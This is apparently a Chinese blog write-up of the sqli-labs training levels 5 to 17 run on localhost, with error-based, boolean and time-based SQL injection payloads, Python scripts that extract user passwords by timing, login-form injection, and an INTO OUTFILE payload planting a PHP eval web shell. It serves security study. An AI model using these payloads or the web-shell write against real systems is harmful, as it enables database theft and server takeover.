<h4 id="截取部分回显结果以无视长度限制"><a href="#截取部分回显结果以无视长度限制" class="headerlink" title="截取部分回显结果以无视长度限制"></a>截取部分回显结果以无视长度限制</h4><p>如果说一个字段的长度就已经超过了updatexml最大的32字符了怎么办呢，我们可以使用left(str,n)&#x2F;right(str,n)来读取，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;^updatexml(1,concat(0x7e,(select(right(table_name,30))from(information_schema.tables)where(table_schema)like(&#x27;security&#x27;)limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_8.png" alt="5_8"></p>
<p>后面发现用substring也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(substring(password,1,1)) from security.users),0x7e))#&amp;passwd=admin</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5_9.png" alt="5_9"></p>
<h3 id="extractvalue-目标xml文档，xml路径"><a href="#extractvalue-目标xml文档，xml路径" class="headerlink" title="extractvalue(目标xml文档，xml路径)"></a>extractvalue(目标xml文档，xml路径)</h3><p>大体上和updatexml相似，只是少一个参数而已，类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and extractvalue(1,concat(0x7e,(select(database())),0x7e))--+</span><br></pre></td></tr></table></figure>

<h2 id="No-6"><a href="#No-6" class="headerlink" title="No.6"></a>No.6</h2><p>和第五关一样，只是把<code>?id=-1&#39;</code> 改成了<code>?id=-1&quot;</code></p>
<h2 id="No-7【输出到外部】"><a href="#No-7【输出到外部】" class="headerlink" title="No.7【输出到外部】"></a>No.7【输出到外部】</h2><p>还是先测试注入点</p>
<p>?id&#x3D;1正常</p>
<p>?id&#x3D;1 and 1&#x3D;2也正常，说明不是数字型注入</p>
<p>?id&#x3D;1’发现报错</p>
<p>?id&#x3D;1”发现不报错</p>
<p>那么接下来就以单引号为基础来找注入点</p>
<blockquote>
<p>为什么接下来就以单引号为基础来找注入点？</p>
<p>以这道题为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>单引号围起来的地方，里面id数值之后所有除了单引号的符号都会被忽略，所有双引号后加东西是没有意义的。</p>
</blockquote>
<p>?id&#x3D;1’)) –+发现正常回显，于是推测原语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/7_1.png" alt="7_1"></p>
<p>想到可能要将回显结果输出到一个外部文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,database(),3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\test.txt&quot;--+</span><br><span class="line">/* 一定记住要用\\而不是\，应该是要转义的原因 */</span><br></pre></td></tr></table></figure>

<p>这样查看test.txt就可以看到</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/7_2.png" alt="7_2"></p>
<p>可是正常情况下，我们不可能进到人家文件夹里看东西，如果那样的话，sql注入也没有意义了，于是我们想到写入一句话木马：【一句话外面的双引号不能少，单引号还真不行，因为包裹id就用的单引号，可能会产生一些错误】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;ag&#x27;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>

<p>接着就可以连接蚁剑了</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/7_3.png" alt="7_3"></p>
<h2 id="No-8"><a href="#No-8" class="headerlink" title="No.8"></a>No.8</h2><p>首先测试注入点，发现是单引号注入，然后尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;ag&#x27;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>

<p>直接成功，但是这题也可以用布尔型注入和时间型注入。</p>
<h2 id="No-9【时间型注入】"><a href="#No-9【时间型注入】" class="headerlink" title="No.9【时间型注入】"></a>No.9【时间型注入】</h2><p>这一关找注入点比较恼火，测试了单引号，双引号，括号等等的东西，都只返回一个“You are in…..”</p>
<p>甚至<code>?id=1&#39; and 1=2 --+</code>这种类似于布尔型注入，都返回“You are in…..”</p>
<p>于是这题就只能使用时间型注入了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substring((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit i,1),j,1))&gt;k),1,sleep(2)) --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解释下这个payload：</p>
<p>选到了第i个字段以后，截取其中第j个字母【substring】，判断这个字母的ascii码是否大于k，如果大于k则正常返回页面，如果小于k则两秒后返回页面。</p>
</blockquote>
<p>然后这样未免有些太麻烦了，于是就写了个脚本【这里爆库和爆表和爆字段长度都不长，不需要limit，最后爆具体内容要用到】</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost/Sql-labs/Less-9&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(0,10):</span></span><br><span class="line">    <span class="comment">#print(&quot;table&quot; +str(i)+&quot;:&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;?id=1&#x27; and if((ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&quot;</span> +<span class="built_in">str</span>(j)+ <span class="string">&quot;,1))&gt;&quot;</span> +<span class="built_in">str</span>(k)+ <span class="string">&quot;),1,sleep(2)) --+&quot;</span></span><br><span class="line">        time1 = time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        time2 = time.time()</span><br><span class="line">        use = time2 - time1</span><br><span class="line">        <span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="No-10"><a href="#No-10" class="headerlink" title="No.10"></a>No.10</h2><p>这一关和第九关一样，就是注入点从?id&#x3D;1’变成了?id&#x3D;1”</p>
<p>这块就补上No.9里差的最后一步要用limit的注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost/Sql-labs/Less-10&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;password&quot;</span> +<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&#x27;?id=1&quot; and if((ascii(substring((select password from security.users limit &#x27;</span> +<span class="built_in">str</span>(i)+ <span class="string">&#x27;,1),&#x27;</span> +<span class="built_in">str</span>(j)+ <span class="string">&#x27;,1))&gt;&#x27;</span> +<span class="built_in">str</span>(k)+ <span class="string">&#x27;),1,sleep(2)) --+&#x27;</span></span><br><span class="line">            time1 = time.time()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = time.time()</span><br><span class="line">            use = time2 - time1</span><br><span class="line">            <span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="No-11【登录框注入】"><a href="#No-11【登录框注入】" class="headerlink" title="No.11【登录框注入】"></a>No.11【登录框注入】</h2><p>这关开始就进入了带有登录框的sql注入了。</p>
<p>一般这种输入框的后端请求数据库的格式都类似这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>于是我们可以这样构造：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11_1.png" alt="11_1"></p>
<p>就相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure>

<p>接下来其实就和前十关爆的核心方法差距不大了</p>
<p>爆列数：【2正常，得知是2列】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3#&amp;passwd=123</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11_2.png" alt="11_2"></p>
<p>爆库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx&#x27; union select 1,database()#&amp;passwd=123</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11_3.png" alt="11_3"></p>
<p>爆表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#&amp;passwd=123</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11_4.png" alt="11_4"></p>
<p>爆列：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;#&amp;passwd=123</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11_5.png" alt="11_5"></p>
<p>爆具体字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx&#x27; union select group_concat(username),group_concat(password) from security.users#&amp;passwd=123</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11_6.png" alt="11_6"></p>
<h3 id="有趣发现1"><a href="#有趣发现1" class="headerlink" title="有趣发现1"></a>有趣发现1</h3><blockquote>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11_7.png" alt="11_7"></p>
<p>在group_concat函数里面用right()，每一个字段的长度都会被截取到3</p>
</blockquote>
<h2 id="No-12"><a href="#No-12" class="headerlink" title="No.12"></a>No.12</h2><p>这一关和No.11区别不大，只是注入点变成了<code>uname=admin&quot;)#&amp;passwd=123</code></p>
<h3 id="有趣的发现2"><a href="#有趣的发现2" class="headerlink" title="有趣的发现2"></a>有趣的发现2</h3><blockquote>
<p>还有就是总结一下，后端请求sql语句用了什么哪种引号，只有注入时测试带这种引号的注入点才能成功，比如这题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>因为原式语句里带了双引号，你只有测试<code>?id=1&quot;</code>或者?id&#x3D;1”)这类带双引号的语句才会报错【双引号不匹配】，输入类似<code>?id=1&#39;</code>的语句不会报错【’在“”包裹下只会被当成普通的字符，相当于请求一个username为admin’的用户，不会成功】</p>
</blockquote>
<h2 id="No-13"><a href="#No-13" class="headerlink" title="No.13"></a>No.13</h2><p>先测试注入点，发现注入点是<code>?uname=admin&#39;)#</code></p>
<p>然后就开始像前两关一样注入，可是发现没有任何回显，那么就想到用No.5的报错型注入，就像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=xxx&#x27;) union select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.schemata group by x #&amp;passwd=admin</span><br><span class="line">或者</span><br><span class="line">uname=xxx&#x27;) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),0x7e),1)#&amp;passwd=admin</span><br><span class="line">或者</span><br><span class="line">uname=xxx&#x27;) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),0x7e))#&amp;passwd=admin</span><br></pre></td></tr></table></figure>

<p>就可以注入成功</p>
<h2 id="No-14"><a href="#No-14" class="headerlink" title="No.14"></a>No.14</h2><p>也没啥，就是注入点变成了<code>?uname=xxx&quot;</code></p>
<h2 id="No-15"><a href="#No-15" class="headerlink" title="No.15"></a>No.15</h2><p>测试了一下这关不回显也不报错，只能用时间注入或者布尔注入</p>
<p>布尔注入测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin/*测试符号*/ and 1=1 #&amp;passwd=xxx            //成功</span><br><span class="line">uname=admin/*测试符号*/ and 1=2 #&amp;passwd=xxx            //失败</span><br></pre></td></tr></table></figure>

<p>布尔注入测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin/*测试符号*/ and sleep(2) #&amp;passwd=xxx</span><br></pre></td></tr></table></figure>

<p>最后测得注入点是单引号。</p>
<p>于是可以构造布尔注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;100#&amp;passwd=xxx</span><br></pre></td></tr></table></figure>

<p>当然也可以构造时间注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if((ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;101),1,sleep(2))#&amp;passwd=xxx</span><br></pre></td></tr></table></figure>

<h3 id="遗留疑惑1"><a href="#遗留疑惑1" class="headerlink" title="遗留疑惑1"></a>遗留疑惑1</h3><ol>
<li><p>布尔注入时，写脚本时候，requests.text返回成功页面和失败页面没有区别。</p>
</li>
<li><p>现在发现，好像是post数据通过python脚本传不过去。。。很迷，自己测试的本地post都成功</p>
</li>
<li><p>我简直要吐了。调试了那么多东西，改了将近一天时间，你们知道错误出在哪吗？？？！！！错误出在：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &#x27;http://localhost/Sql-labs/Less-15&#x27;</span><br><span class="line">这玩意我少加了/</span><br><span class="line">url = &#x27;http://localhost/Sql-labs/Less-15/&#x27;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>所以布尔注入的脚本就是这样：[不行了气死我了]</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## by Albatross</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost/Sql-labs/Less-15/&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;password&quot;</span> +<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            uname = <span class="string">&quot;admin&#x27; and if((ascii(substring((select password from security.users limit &quot;</span> +<span class="built_in">str</span>(i)+ <span class="string">&quot;,1),&quot;</span> +<span class="built_in">str</span>(j)+ <span class="string">&quot;,1))&gt;&quot;</span> +<span class="built_in">str</span>(k)+ <span class="string">&quot;),1,sleep(2))#&quot;</span></span><br><span class="line">            passwd = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">            data1 = &#123;<span class="string">&quot;uname&quot;</span>:uname,<span class="string">&quot;passwd&quot;</span>:passwd,<span class="string">&quot;submit&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">            time1 = time.time()</span><br><span class="line">            r = requests.post(url,data=data1)</span><br><span class="line">            time2 = time.time()</span><br><span class="line">            use = time2 - time1</span><br><span class="line">            <span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="No-16"><a href="#No-16" class="headerlink" title="No.16"></a>No.16</h2><p>和上一关区别不大，只是注入点变成了<code>?uname=admin&quot;)</code></p>
<h2 id="No-17【UPDATE修改密码】"><a href="#No-17【UPDATE修改密码】" class="headerlink" title="No.17【UPDATE修改密码】"></a>No.17【UPDATE修改密码】</h2><p>这一关就比较不一样了，这是一个修改密码的页面，而且发现无论对uname做什么操作，都会得到：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_1.png" alt="17_1"></p>
<p>查看源代码发现uname数据要经过下面这个函数的过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>addslashes() 函数，这是个什么东西呢？<br>addslashes()函数：一个会在预定义字符之前添加反斜杠的函数，即会帮助转义</p>
<p>预定义字符有：</p>
<ul>
<li>单引号(’)</li>
<li>双引号(“)</li>
<li>反斜杠()</li>
<li>NULL</li>
</ul>
<p>所以在平时过程中，咱就不用手动加转义字符了，但怕有些人进行了双层转义，所以可以使用 get_magic_quotes_gpc() 来进行检测，其参数为 string，string类型，内容为规定要转义的字符串，该函数返回内容为已转义的字符串，该函数适用于 PHP 版本 4.0+</p>
<p>第三个要介绍的就是 stripslashes() 函数，该函数可以删除 addslashes() 函数添加的反斜杠</p>
<p>最后就是 mysql_real_escape_string() 函数：<br> 它将转义 SQL 语句中使用的字符串中的特殊字符</p>
</blockquote>
<p>那么我们想到能不能对passwd这个参数做一些注入。</p>
<p>我们知道，修改密码用到的是UPDATE，类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;</span><br></pre></td></tr></table></figure>

<p>那么，我们的union就不再管用了：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_2.png" alt="17_2"></p>
<p>那就想到是否可以报错型注入：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_3.png" alt="17_3"></p>
<p>但是用floor注入的时候就遇到了一些问题：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_4.png" alt="17_4"></p>
<ol>
<li><p>首先用and不可以，会报错：Truncated incorrect DOUBLE value: ‘Dick’【后来发现把Dick这种字母改成数字就完全没有问题了】</p>
</li>
<li><p>其次select的数字必须是一列，可能是因为update本身就修改一列的数据。这样就屏蔽了另外一种floor报错【不用别名而要请求多列的】</p>
